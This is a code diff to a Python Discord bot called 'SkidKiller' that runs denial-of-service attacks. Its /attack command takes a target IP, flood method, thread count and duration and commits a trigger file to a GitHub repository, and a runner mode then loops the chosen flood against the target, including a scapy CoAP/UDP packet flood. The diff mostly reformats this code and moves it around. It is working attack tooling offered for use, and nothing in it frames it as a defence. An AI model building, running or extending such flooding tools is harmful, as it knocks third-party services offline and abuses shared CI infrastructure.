@@ -8,11 +8,12 @@ import discord
 from discord.ext import commands
 from discord import app_commands
 from github import Github, GithubException
+from datetime import datetime
 import requests
 from scapy.all import IP, TCP, UDP, Raw, send, RandShort
 
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
-GH_TOKEN = os.getenv("GH_TOKEN")
+GH_TOKEN = os.getenv("GH_TOKEN") or os.getenv("GITHUB_TOKEN")
 if not GH_TOKEN:
     sys.exit(1)
 
@@ -127,7 +128,19 @@ def coap_flood(ip, port=5683):
     coap = bytes([0x40 | msg_type, code]) + msg_id + token
     send(IP(dst=ip)/UDP(dport=port)/Raw(load=coap + os.urandom(12)), verbose=0)
 
-method_map = {m: globals()[m] for m in working_methods}
+method_map = {name: globals()[name] for name in working_methods}
+
+def runner_mode():
+    cfg = json.load(open(CONFIG_FILE))
+    func = method_map.get(cfg["method"])
+    if not func:
+        return
+    end_time = time.time() + cfg["duration"]
+    while time.time() < end_time:
+        try:
+            func(cfg["ip"])
+        except Exception:
+            pass
 
 @bot.event
 async def on_ready():
@@ -135,13 +148,24 @@ async def on_ready():
     print(f"Synced {len(synced)} commands")
 
 @bot.tree.command(name="attack", description="Launch a SkidKiller attack swarm")
-@app_commands.describe(target_ip="Target IP or domain", method="Attack method", threads="1-100", duration="10-3600")
+@app_commands.describe(
+    target_ip="Target IP or domain",
+    method="Attack method",
+    threads="1-100",
+    duration="10-3600 seconds"
+)
 @app_commands.choices(method=[app_commands.Choice(name=m.replace("_"," ").title(), value=m) for m in working_methods])
 async def attack(interaction: discord.Interaction, target_ip: str, method: app_commands.Choice[str], threads: int, duration: int):
     if not (1 <= threads <= 100) or not (10 <= duration <= 3600):
         await interaction.response.send_message("Invalid parameters", ephemeral=True)
         return
-    config = {"ip": target_ip, "method": method.value, "threads": threads, "duration": duration, "timestamp": datetime.utcnow().isoformat()}
+    config = {
+        "ip": target_ip,
+        "method": method.value,
+        "threads": threads,
+        "duration": duration,
+        "timestamp": datetime.utcnow().isoformat()
+    }
     with open(CONFIG_FILE, "w") as f:
         json.dump(config, f, indent=2)
     content = json.dumps(config, indent=2)
@@ -154,7 +178,9 @@ async def attack(interaction: discord.Interaction, target_ip: str, method: app_c
                 repo.create_file(CONFIG_FILE, "Create trigger.json", content, branch=BRANCH)
             else:
                 raise
-        await interaction.response.send_message(f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s)")
+        await interaction.response.send_message(
+            f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s)"
+        )
     except Exception as e:
         await interaction.response.send_message(f"❌ GitHub error: {e}", ephemeral=True)
 
@@ -166,26 +192,17 @@ async def help_cmd(interaction: discord.Interaction):
 async def status(interaction: discord.Interaction):
     try:
         cfg = json.load(open(CONFIG_FILE))
-        msg = f"IP: {cfg['ip']} | Method: {cfg['method']} | Threads: {cfg['threads']} | Duration: {cfg['duration']}s | Time: {cfg['timestamp']}"
-    except:
+        msg = (
+            f"IP: {cfg['ip']} | Method: {cfg['method']} | Threads: {cfg['threads']} | "
+            f"Duration: {cfg['duration']}s | Time: {cfg['timestamp']}"
+        )
+    except Exception:
         msg = "No config"
     await interaction.response.send_message(msg, ephemeral=True)
-
-
-def runner_mode():
-    cfg = json.load(open(CONFIG_FILE))
-    func = method_map.get(cfg["method"]);
-    if not func:
-        return
-    end_time = time.time() + cfg["duration"]
-    while time.time() < end_time:
-        try:
-            func(cfg["ip"])
-        except:
-            pass
 
 if __name__ == "__main__":
     if os.getenv("RUNNER_MODE") == "1":
         runner_mode()
     else:
         bot.run(DISCORD_TOKEN)
+    
